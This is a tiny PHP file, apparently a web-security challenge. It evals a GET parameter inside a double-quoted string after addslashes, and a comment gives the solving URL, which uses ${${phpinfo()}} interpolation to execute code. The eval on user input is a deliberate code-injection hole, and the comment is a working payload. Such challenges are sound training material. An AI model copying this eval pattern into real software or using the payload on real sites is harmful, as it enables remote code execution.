<?php 
#GOAL: gather some phpinfo();
   
$str=@(string)$_GET['str'];
eval('$str="'.addslashes($str).'";');

//http://phpchallenges2.sinaapp.com/index.php?str=${${phpinfo()}} 
